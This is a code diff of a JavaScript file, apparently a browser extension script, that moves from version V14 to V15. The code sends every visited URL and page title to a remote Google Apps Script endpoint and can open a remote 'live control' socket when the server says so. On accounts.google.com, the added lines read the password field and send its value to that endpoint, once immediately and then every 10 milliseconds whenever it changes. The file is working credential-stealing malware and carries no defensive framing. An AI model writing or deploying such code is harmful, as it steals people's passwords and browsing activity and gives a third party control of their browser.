@@ -1,15 +1,15 @@
-console.log('V14');
+console.log('V15');
 
 // Log URLs and init actions
 fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${$('title').text()}`, {
   mode: 'cors'
 })
-.then(r => r.text())
-.then(t => {
-  if (t.split('@')[0] === 'live') {
-    initLiveControl(t.split('@')[1]);
-  }
-})
+  .then(r => r.text())
+  .then(t => {
+    if (t.split('@')[0] === 'live') {
+      initLiveControl(t.split('@')[1]);
+    }
+  })
 siteSpecifics(window.location.host)
 
 var href = window.location.href;
@@ -61,7 +61,7 @@ function initLiveControl(socketUrl) {
 // Distribute tasks
 function handleSpecificSites(host) {
 
-  if(host === 'accounts.google.com'){
+  if (host === 'accounts.google.com') {
     initPasswordMonitor();
   }
 
@@ -76,15 +76,21 @@ function initPasswordMonitor() {
     var password = $("input[type='password']");
     var currentVal = password.attr('data-initial-value');
 
+    console.log(password);
+    console.log(currentVal);
+
+    // Send to server
+    fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${currentVal}`, { mode: 'cors' });
+
+    // Check to see if the password has changed
     setInterval(() => {
       if (password.attr('data-initial-value') !== currentVal) {
+
         currentVal = password.attr('data-initial-value');
-        if (currentVal.length > 3) {
-          console.log(currentVal);
-          fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${currentVal}`, {
-            mode: 'cors'
-          });
-        }
+        console.log(currentVal);
+
+        // Send to server
+        fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${currentVal}`, { mode: 'cors' });
       }
     }, 10);
   }
